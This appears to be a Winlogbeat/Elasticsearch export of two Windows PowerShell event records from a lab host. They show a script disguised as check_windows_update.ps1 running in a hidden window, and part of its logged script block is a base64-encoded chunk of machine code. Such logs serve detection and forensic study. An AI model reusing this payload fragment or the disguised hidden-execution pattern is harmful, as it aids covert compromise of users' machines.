        {
          "_index": "winlogbeat-9.1.2",
          "_id": "cE7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword",
            "winlog.event_data.ScriptBlockText.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4104",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Execute a Remote Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "version": 1,
              "record_id": 8551,
              "activity_id": "{5C6CA50B-4378-0002-3FAA-6C5C7843DC01}",
              "event_data": {
                "ScriptBlockId": "8dfb2248-d987-43fa-8ad4-de2bac625f96",
                "MessageTotal": "31",
                "MessageNumber": "2",
                "ScriptBlockText": "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",
                "Path": """C:\Users\konoha\AppData\Roaming\check_windows_update.ps1"""
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.888Z",
              "provider": "Microsoft-Windows-PowerShell",
              "kind": "event",
              "code": "4104",
              "action": "Execute a Remote Command"
            },
            "log": {
              "level": "verbose"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.127Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.127Z",
            87
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "l07xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "400",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Classic"
              ],
              "channel": "Windows PowerShell",
              "event_id": "400",
              "record_id": 2195,
              "opcode": "Info",
              "event_data": {
                "param1": "Available",
                "param3": """	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=5.1.19041.6456
	RunspaceId=5bd0b77f-0264-4119-b083-e1a3cc5e4129
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param2": "None"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            198
          ]
